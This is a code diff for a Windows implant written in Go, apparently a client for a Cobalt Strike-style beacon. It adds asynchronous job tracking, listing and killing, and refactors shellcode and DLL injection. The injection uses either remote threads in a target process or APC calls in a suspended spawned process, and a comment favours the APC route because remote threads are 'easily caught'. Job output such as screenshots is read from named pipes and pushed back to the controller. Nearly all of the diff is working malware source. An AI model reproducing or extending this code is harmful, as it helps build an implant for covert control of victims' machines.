@@ -5,6 +5,7 @@ import (
 	"errors"
 	"fmt"
 	"github.com/Microsoft/go-winio"
+	"github.com/shirou/gopsutil/v3/process"
 	"golang.org/x/sys/windows"
 	"io"
 	"main/config"
@@ -33,20 +34,49 @@ var (
 	logonUserA              = advapi32.NewProc("LogonUserA")
 )
 
+type job struct {
+	jid         int
+	pid         uint32
+	description string
+	pipeName    string
+	stopCh      chan bool
+}
+
+var jobs []job
+
+// there is no static var in golang
+var jobCnt = 0
+
+// init length to 1, or it will block until receiver receive message
+var pidChan = make(chan uint32, 1)
+
+func removeJob(jid int) {
+	for i, job := range jobs {
+		if job.jid == jid {
+			jobs = append(jobs[:i], jobs[i+1:]...)
+		}
+	}
+}
+
 // implement of beacon.Job
 
 // inject command specify a pid to inject, so it seems no need to adjust whether it is x86 or x64
 // TODO still didn't work
-func InjectDll(pid uint32, dll []byte) error {
+func InjectDll(b []byte) error {
+	pid, dll, err := parseInject(b)
 	processHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, true, pid)
 	if err != nil {
+		// if you don't put a value into channel will cause blocking in handle job
+		pidChan <- 0
 		return errors.New(fmt.Sprintf("OpenProcess error: %s", err))
 	}
-	return CreateRemoteThread(processHandle, dll)
+	pidChan <- pid
+	// record job here
+	return createRemoteThread(processHandle, dll)
 }
 
 // you should ensure x86 shellcode inject to x86 process
-func GetSpawnProcessX86() (string, string) {
+func getSpawnProcessX86() (string, string) {
 	var arr []string
 	if sysinfo.IsProcessX64() {
 		path := config.SpawnToX86
@@ -63,7 +93,7 @@ func GetSpawnProcessX86() (string, string) {
 	return program, args
 }
 
-func GetSpawnProcessX64() (string, string) {
+func getSpawnProcessX64() (string, string) {
 	var arr []string
 	if sysinfo.IsProcessX64() {
 		path := strings.Replace(config.SpawnToX64, "sysnative", "system32", 1)
@@ -81,8 +111,8 @@ func GetSpawnProcessX64() (string, string) {
 }
 
 func SpawnAndInjectDllX64(dll []byte) error {
-	program, args := GetSpawnProcessX64()
-	err := SpawnAndInjectDll(dll, program, args)
+	program, args := getSpawnProcessX64()
+	err := spawnAndInjectDll(dll, program, args)
 	if err != nil {
 		return err
 	}
@@ -90,24 +120,26 @@ func SpawnAndInjectDllX64(dll []byte) error {
 }
 
 func SpawnAndInjectDllX86(dll []byte) error {
-	program, args := GetSpawnProcessX86()
-	err := SpawnAndInjectDll(dll, program, args)
+	program, args := getSpawnProcessX86()
+	err := spawnAndInjectDll(dll, program, args)
 	if err != nil {
 		return err
 	}
 	return nil
 }
 
-func SpawnAndInjectDll(dll []byte, program string, args string) error {
+func spawnAndInjectDll(dll []byte, program string, args string) error {
 	procInfo := &windows.ProcessInformation{}
 	startupInfo := &windows.StartupInfo{
 		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
 		ShowWindow: 1,
 	}
-	errCreateProcess := CreateProcessNative(windows.StringToUTF16Ptr(program), windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
+	errCreateProcess := createProcessNative(windows.StringToUTF16Ptr(program), windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
 	if errCreateProcess != nil && errCreateProcess != windows.SEVERITY_SUCCESS {
+		pidChan <- 0
 		return errors.New(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
 	}
+	pidChan <- procInfo.ProcessId
 	return callUserAPC(procInfo, dll)
 
 	// createRemoteThread can be easily caught, you should never use it
@@ -146,7 +178,7 @@ func callUserAPC(procInfo *windows.ProcessInformation, shellcode []byte) error {
 	return nil
 }
 
-func CreateRemoteThread(processHandle windows.Handle, shellcode []byte) error {
+func createRemoteThread(processHandle windows.Handle, shellcode []byte) error {
 	addr, _, errVirtualAlloc := virtualAllocEx.Call(uintptr(processHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 
 	if errVirtualAlloc != nil && errVirtualAlloc != windows.SEVERITY_SUCCESS {
@@ -181,7 +213,7 @@ func CreateRemoteThread(processHandle windows.Handle, shellcode []byte) error {
 	return nil
 }
 
-func HandlerJob(b []byte) error {
+func HandlerJobAsync(b []byte) error {
 	buf := bytes.NewBuffer(b)
 	// inject it gives pid, spawn it gives zero
 	pidByte := make([]byte, 4)
@@ -192,33 +224,89 @@ func HandlerJob(b []byte) error {
 	_, _ = buf.Read(sleepTimeByte)
 	callbackType := packet.ReadShort(callbackTypeByte)
 	sleepTime := packet.ReadShort(sleepTimeByte)
-	pipeName, _ := ParseAnArg(buf)
-	// command type, seems useless?
-	commandType, _ := ParseAnArg(buf)
-	// sleep time some time is small, some time is huge, so set it to Microsecond
-	fmt.Printf("Sleep time: %d\n", sleepTime)
-	time.Sleep(time.Microsecond * time.Duration(sleepTime))
-	result, err := ReadNamedPipe(pipeName)
-	if err != nil {
-		return err
+	pipeName, _ := parseAnArg(buf)
+	commandType, _ := parseAnArg(buf)
+	// I guess this is kind of sync
+	pid := <-pidChan
+	if pid == 0 {
+		return nil
 	}
+	currentJid := jobCnt
+	stopCh := make(chan bool, 1)
+	j := job{
+		jid:         jobCnt,
+		pid:         pid,
+		description: string(commandType),
+		pipeName:    string(pipeName),
+		stopCh:      stopCh,
+	}
+	jobCnt++
+	jobs = append(jobs, j)
 
-	switch string(commandType) {
-	case "take screenshot":
-		// take screenshot will have 4 bytes to indicate the data length, but server doesn't deal with it
-		result = result[4:]
-	default:
+	// change it async
+	go func() {
+		// sleep time some time is small, some time is huge, so set it to Microsecond
+		//fmt.Printf("Sleep time: %d\n", sleepTime)
+		time.Sleep(time.Microsecond * time.Duration(sleepTime))
+		result, err := readNamedPipe(j)
+		if err != nil {
+			ErrorMessage(err.Error())
+			removeJob(currentJid)
+			return
+		}
+
+		switch string(commandType) {
+		case "take screenshot":
+			// take screenshot will have 4 bytes to indicate the data length, but server doesn't deal with it
+			result = result[4:]
+		default:
+		}
+		finalPacket := packet.MakePacket(int(callbackType), []byte(result))
+		packet.PushResult(finalPacket)
+		removeJob(currentJid)
+	}()
+	return nil
+}
+
+func ListJobs() error {
+	result := ""
+	for _, job := range jobs {
+		result += fmt.Sprintf("%d\t%d\t%s\n", job.jid, job.pid, job.description)
 	}
-	finalPacket := packet.MakePacket(int(callbackType), []byte(result))
+	finalPacket := packet.MakePacket(CALLBACK_LIST_JOBS, []byte(result))
 	packet.PushResult(finalPacket)
 	return nil
 }
 
-func ReadNamedPipe(pipeName []byte) (string, error) {
-	pipe, err := winio.DialPipe(string(pipeName), nil)
+func KillJob(b []byte) error {
+	jid := packet.ReadShort(b)
+	for _, j := range jobs {
+		if j.jid == int(jid) {
+			j.stopCh <- true
+			processes, err := process.Processes()
+			if err != nil {
+				return err
+			}
+			for _, p := range processes {
+				if p.Pid == int32(j.pid) {
+					// TODO in case of inject, this would kill a normal process
+					removeJob(j.jid)
+					err = p.Kill()
+					if err != nil {
+						return err
+					}
+				}
+			}
+		}
+	}
+	return nil
+}
+
+func readNamedPipe(j job) (string, error) {
+	pipe, err := winio.DialPipe(j.pipeName, nil)
 	if err != nil {
-		// try it twice
-		pipe, err = winio.DialPipe(string(pipeName), nil)
+		// try it twice in case of sleep time is too short
+		pipe, err = winio.DialPipe(j.pipeName, nil)
 		if err != nil {
 			return "", errors.New(fmt.Sprintf("DialPipe error: %s", err))
 		}
@@ -227,14 +315,18 @@ func ReadNamedPipe(pipeName []byte) (string, error) {
 	result := ""
 	buf := make([]byte, 512)
 	for {
-		n, err := pipe.Read(buf)
-		if err != nil {
-			if err != io.EOF && err != windows.ERROR_PIPE_NOT_CONNECTED {
-				return "", err
+		select {
+		case <-j.stopCh:
+			return "", errors.New("job canceled")
+		default:
+			n, err := pipe.Read(buf)
+			if err != nil {
+				if err != io.EOF && err != windows.ERROR_PIPE_NOT_CONNECTED {
+					return "", err
+				}
+				return result, nil
 			}
-			break
+			result += string(buf[:n])
 		}
-		result += string(buf[:n])
 	}
-	return result, nil
 }
